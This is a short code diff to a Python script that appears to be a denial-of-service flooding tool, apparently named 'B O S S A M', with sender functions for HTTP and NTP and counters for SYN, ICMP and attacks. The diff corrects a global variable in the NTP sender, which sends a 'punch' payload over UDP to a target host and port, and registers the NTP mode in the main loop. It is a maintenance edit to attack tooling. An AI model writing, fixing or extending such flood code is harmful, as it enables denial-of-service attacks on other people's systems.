@@ -191,7 +191,7 @@ def httpsender(host, port, timer, punch):
 
 def ntpsender(host, port, timer, punch):
 	global haid
-	global http
+	global ntp
 	global aid
 	global tattacks
 
@@ -206,10 +206,11 @@ def ntpsender(host, port, timer, punch):
 			sock.sendto(punch, (host, int(port)))
 			sock.close()
 		except socket.error:
-				pass
+			pass
 
 	haid -= 1
 	aid -= 1
+
 
 def main():
 	global fsubs
@@ -227,6 +228,7 @@ def main():
 	global syn
 	global icmp
 	global http
+	global ntp
 
 	while True:
 		sys.stdout.write("\x1b]2;B O S S A M\x07")
